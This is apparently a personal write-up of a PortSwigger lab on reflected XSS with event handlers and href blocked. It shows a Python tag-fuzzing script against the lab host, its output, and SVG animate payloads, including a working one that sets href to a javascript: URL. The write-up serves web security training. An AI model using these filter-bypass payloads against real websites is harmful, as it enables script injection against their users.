# Reflected XSS with event handlers and `href` attributes blocked

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked), you'll learn: Reflected XSS with event handlers and `href` attributes blocked! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★☆☆☆☆☆☆

## Background

This lab contains a [reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability with some whitelisted tags, but all events and anchor `href` attributes are blocked.

To solve the lab, perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that injects a vector that, when clicked, calls the `alert` function.

Note that you need to label your vector with the word "Click" in order to induce the simulated lab user to click your vector. For example:

```html
<a href="">Click me</a>
```

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-25/images/Pasted%20image%2020230101053709.png)

In here, we can see there is a search box.

Let's search something:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-25/images/Pasted%20image%2020230101053731.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-25/images/Pasted%20image%2020230101053754.png)

As you can see, our input is reflected to the web page.

Let's try to inject a JavaScript code:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-25/images/Pasted%20image%2020230101054141.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-25/images/Pasted%20image%2020230101054148.png)

However, the application blocks us.

**Let's fuzz usable tags via a python script:**
```py
#!/usr/bin/env python3

import requests
from threading import Thread
from time import sleep

def sendRequest(tag):
    payload = f'<{tag}>'
    url = f'https://0af200f90416972dc03527bf001500b1.web-security-academy.net/?search={payload}'

    requestResult = requests.get(url)

    if 'Tag is not allowed' not in requestResult.text:
        print(f'[+] Found valid tag: {payload}')

def main():
    # From PortSwigger's Cross-site scripting (XSS) cheat sheet:
    # https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
    listTags = ['a', 'a2', 'abbr', 'acronym', 'address', 'animate', 'animatemotion', 'animatetransform', 'applet', 'area', 'article', 'aside', 'audio', 'audio2', 'b', 'bdi', 'bdo', 'big', 'blink', 'blockquote', 'body', 'br', 'button', 'canvas', 'caption', 'center', 'cite', 'code', 'col', 'colgroup', 'command', 'content', 'custom tags', 'data', 'datalist', 'dd', 'del', 'details', 'dfn', 'dialog', 'dir', 'div', 'dl', 'dt', 'element', 'em', 'embed', 'fieldset', 'figcaption', 'figure', 'font', 'footer', 'form', 'frame', 'frameset', 'h1', 'head', 'header', 'hgroup', 'hr', 'html', 'i', 'iframe', 'iframe2', 'image', 'image2', 'image3', 'img', 'img2', 'input', 'input2', 'input3', 'input4', 'ins', 'kbd', 'keygen', 'label', 'legend', 'li', 'link', 'listing', 'main', 'map', 'mark', 'marquee', 'menu', 'menuitem', 'meta', 'meter', 'multicol', 'nav', 'nextid', 'nobr', 'noembed', 'noframes', 'noscript', 'object', 'ol', 'optgroup', 'option', 'output', 'p', 'param', 'picture', 'plaintext', 'pre', 'progress', 'q', 'rb', 'rp', 'rt', 'rtc', 'ruby', 's', 'samp', 'script', 'section', 'select', 'set', 'shadow', 'slot', 'small', 'source', 'spacer', 'span', 'strike', 'strong', 'style', 'sub', 'summary', 'sup', 'svg', 'table', 'tbody', 'td', 'template', 'textarea', 'tfoot', 'th', 'thead', 'time', 'title', 'tr', 'track', 'tt', 'u', 'ul', 'var', 'video', 'video2', 'wbr', 'xmp']

    for tag in listTags:
        thread = Thread(target=sendRequest, args=(tag,))
        thread.start()
        sleep(0.2)

if __name__ == '__main__':
    main()
```

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Cross-Site-Scripting]
└─# python3 tag_fuzzing.py
[+] Found valid tag: <a>
[+] Found valid tag: <animate>
[+] Found valid tag: <image>
[+] Found valid tag: <svg>
[+] Found valid tag: <title>
```

**Let's go to PortSwigger's [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) to choose a payload:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-25/images/Pasted%20image%2020230101055619.png)

`svg -> animate` looks good.

```html
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-25/images/Pasted%20image%2020230101055734.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-25/images/Pasted%20image%2020230101055740.png)

Hmm... `Event is not allowed`.

**Now, we can use the `attributeName` attribute, and `<a>` tag to create a link:**
```html
<svg><a><animate attributeName=href values=javascript:alert(document.domain)></animate><text x=100 y=100>Click me</text></a>
```

**Beautified:**
```html
<svg>
<a>
    <animate attributeName=href values=javascript:alert(document.domain)></animate>
    <text x=100 y=100>Click me</text>
</a>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-25/images/Pasted%20image%2020230101060745.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-25/images/Pasted%20image%2020230101060753.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-25/images/Pasted%20image%2020230101060759.png)

Nice!

# What we've learned:

1. Reflected XSS with event handlers and `href` attributes blocked